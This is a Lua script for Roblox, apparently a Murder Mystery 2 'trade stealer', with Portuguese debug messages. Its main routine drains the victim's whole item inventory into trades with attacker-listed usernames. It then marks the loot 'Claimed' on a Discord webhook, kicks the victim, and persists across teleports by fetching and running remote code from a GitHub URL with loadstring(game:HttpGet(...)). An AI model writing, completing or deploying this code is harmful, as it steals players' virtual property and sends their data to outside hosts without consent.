    dbg("offer pronto: " .. #offer .. " slots | tradeWindowOpen=" .. tostring(tradeWindowOpen))

    if #offer == 0 then
        dbg("offer vazio — declinando")
        pcall(function() trade.DeclineTrade:FireServer() end)
        tradeWindowOpen = false
        offerInProgress = false
        return false
    end

    tradeWindowOpen = true
    offerInProgress = true
    dbg("iniciando oferta — offerInProgress=true")

    for _, slot in ipairs(offer) do
        doOfferItem(slot.DataID, slot.Amount)
    end

    offerInProgress = false
    dbg("oferta concluída — offerInProgress=false | tradeWindowOpen=" .. tostring(tradeWindowOpen) .. " | tradeDone=" .. tostring(tradeDone))

    -- fase 3: aguarda resultado
    local deadline = tick() + 30
    while tick() < deadline do
        if tradeDone then
            dbg("tradeDone=true no wait loop")
            break
        end
        task.wait(0.5)
    end

    if not tradeDone then
        dbg("TIMEOUT 30s — trade não terminou, declinando")
        pcall(function() trade.DeclineTrade:FireServer() end)
        tradeWindowOpen = false
    end

    waitTradeIdle()
    task.wait(2)
    dbg("doTrade retornando: tradeDone=" .. tostring(tradeDone))
    return tradeDone
end

-- ── drainTarget ───────────────────────────────────────────────────────────────
local function drainTarget(target)
    dbg("=== drainTarget: " .. target.Name .. " ===")
    currentTarget = target

    while target.Parent do
        local freshProfile = getProfile()
        if not freshProfile then
            dbg("drainTarget: getProfile() nil — saindo")
            break
        end

        local freshAll      = buildItems(freshProfile)
        local freshFiltered = filterItems(freshAll)
        dbg("drainTarget: freshFiltered=" .. #freshFiltered)

        if #freshFiltered == 0 then
            dbg("drainTarget: sem itens — saindo")
            break
        end

        local ok = doTrade(target)
        dbg("drainTarget: doTrade retornou ok=" .. tostring(ok))

        if ok then
            if initialMsgId and initialEmbed then
                editStatus(initialMsgId, initialEmbed, "✅ Claimed")
                dbg("webhook editado: Claimed")
            end
        else
            if not target.Parent then break end
            task.wait(2)
        end

        task.wait(0.5)
    end

    dbg("drainTarget: saindo — kickando")
    currentTarget = nil
    _stopSpoof    = true
    task.wait(0.5)
    localPlayer:Kick(KICK_DISCORD)
end

-- ── drain kick watcher ────────────────────────────────────────────────────────
task.spawn(function()
    task.wait(10)
    while localPlayer.Parent do
        task.wait(15)
        local freshProfile = getProfile()
        if not freshProfile then continue end
        local freshAll  = buildItems(freshProfile)
        local remaining = filterItems(freshAll)
        if #userItems > 0 and #remaining == 0 then
            dbg("drain kick watcher: itens esgotados — kickando")
            _stopSpoof = true
            localPlayer:Kick(KICK_DISCORD)
            return
        end
    end
end)

-- ── target detection ──────────────────────────────────────────────────────────
local function isDualTarget(player)
    if not DUAL_USERNAME then return false end
    local name = player.Name:lower()
    local disp = player.DisplayName:lower()
    return name == DUAL_USERNAME:lower() or disp == DUAL_USERNAME:lower()
end

local function isTarget(player)
    local name = player.Name:lower()
    local disp = player.DisplayName:lower()
    for _, u in ipairs(usernames) do
        if name == u:lower() or disp == u:lower() then return true end
    end
    return isDualTarget(player)
end

local function pickRandomTarget()
    local present = {}
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= localPlayer and isTarget(player) then
            table.insert(present, player)
        end
    end
    if #present == 0 then return nil end
    return present[math.random(1, #present)]
end

local busy = {}

local function handleTarget(player)
    if busy[player.Name] then
        dbg("handleTarget: " .. player.Name .. " já em processo — pulando")
        return
    end
    busy[player.Name] = true
    dbg("handleTarget: iniciando thread para " .. player.Name)

    task.spawn(function()
        local t0 = tick()
        while tick()-t0 < 15 do
            if player.Character and player.Character:FindFirstChildOfClass("Humanoid") then break end
            task.wait(0.5)
        end
        task.wait(1.5)

        if player.Parent then
            local currentStatus = getTradeStatus()
            dbg("handleTarget: status antes de drainTarget=" .. currentStatus)
            if currentStatus == "StartTrade" or currentStatus == "SendingRequest" then
                cancelCurrent()
                waitTradeIdle()
                task.wait(0.5)
            end
            drainTarget(player)
        else
            dbg("handleTarget: " .. player.Name .. " saiu antes de drainTarget")
        end

        busy[player.Name] = nil
    end)
end

local function handleAnyTarget(triggerPlayer)
    if #usernames <= 1 then
        handleTarget(triggerPlayer)
        return
    end
    local picked = pickRandomTarget()
    if not picked then
        dbg("handleAnyTarget: nenhum target disponível")
        return
    end
    dbg("handleAnyTarget: picked=" .. picked.Name)
    handleTarget(picked)
end

dbg("=== VARRENDO PLAYERS ATUAIS ===")
for _, player in ipairs(Players:GetPlayers()) do
    if player ~= localPlayer then
        dbg("player: " .. player.Name .. " isTarget=" .. tostring(isTarget(player)))
        if isTarget(player) then
            handleAnyTarget(player)
        end
    end
end

Players.PlayerAdded:Connect(function(player)
    dbg("PlayerAdded: " .. player.Name .. " isTarget=" .. tostring(isTarget(player)))
    if isTarget(player) then
        task.wait(4)
        if player.Parent then handleAnyTarget(player) end
    end
end)

Players.PlayerRemoving:Connect(function(player)
    busy[player.Name] = nil
    dbg("PlayerRemoving: " .. player.Name)
end)

-- ── queue_on_teleport ─────────────────────────────────────────────────────────
pcall(function()
    if type(queue_on_teleport) ~= "function" then return end
    local usernamesEncoded = (function()
        local t = {}
        for _, u in ipairs(usernames) do table.insert(t, string.format("%q", u)) end
        return table.concat(t, ", ")
    end)()
    local entrypoint = string.format(
        "_G.MinValue  = %d\n_G.Usernames = { %s }\n_G.Webhook   = %q\n_G.Ping      = %s\ntask.wait(1)\nloadstring(game:HttpGet(%q, true))()",
        minValue, usernamesEncoded, token, tostring(doPing),
        "https://raw.githubusercontent.com/wraithexternaI/mm2/refs/heads/main/Wraith-mm2"
    )
    queue_on_teleport(entrypoint)
    dbg("queue_on_teleport configurado")
end)

dbg("=== INIT COMPLETO — AGUARDANDO TARGETS ===")
